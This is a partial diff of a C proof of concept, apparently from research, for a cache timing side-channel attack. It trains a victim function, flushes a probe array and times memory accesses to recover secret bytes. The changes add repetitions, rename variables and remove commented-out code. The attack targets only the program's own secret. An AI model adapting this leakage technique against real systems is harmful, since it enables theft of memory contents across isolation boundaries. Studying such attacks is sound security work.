@@ -6,7 +6,7 @@
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 1
+#define REPETITIONS 5
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
 #define SECRET_SIZE 8
@@ -67,42 +67,22 @@ int* prepare(int secret_index) {
     flush_arr((void*)flush_reload_arr, N_PAGES);
     cpuid();
 
-
-    //NO IDEA WHY I NEED THIS
     int n_accesses = N_TRAINING + 1;
-    char init_indices[n_accesses];
-    //END OF WEIRD SECTION
-    for(int i = 0; i < n_accesses; i++) init_indices[i] = false;
-    init_indices[n_accesses-1] = true;
+    char init_bools[n_accesses];
+    for(int i = 0; i < n_accesses; i++) init_bools[i] = false;
+    init_bools[n_accesses-1] = true;
 
     for(int i = 0; i < n_accesses; i++) {
         touch_secret(secret_index);
-        victim_func(init_indices[i]);
+        victim_func(init_bools[i]);
         cpuid();
-        if(init_indices[i] == false) {
+        if(init_bools[i] == false) {
             cpuid();
             flush_arr((void*)flush_reload_arr, N_PAGES);
         }
         cpuid();
 
     }
-
-
-    /*cpuid();
-    flush_arr((void*)flush_reload_arr, N_PAGES);
-    //TOUCH SECRET START
-    touch_secret(secret_index);
-    //TOUCH SECRET END
-    cpuid();
-
-    //VICTIM FUNC START
-    victim_func(2);
-    /*int val = 5;
-    flush((void*)&val);
-    cpuid();
-    init_func(val);
-    uninit_func();//*/
-    //VICTIM FUNC END
 
     cpuid();
     //time loading duration per array index
@@ -115,14 +95,13 @@ int main(int argc, char** argv) {
     srand(time(0));
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
-    //results[0][0] = prepare(0);
     for(int r = 0; r < REPETITIONS; r++) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < SECRET_SIZE; s++) {
             results[r][s] = prepare(s);
             cpuid();
         }
-    }//*/
+    }
 
     print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);
 
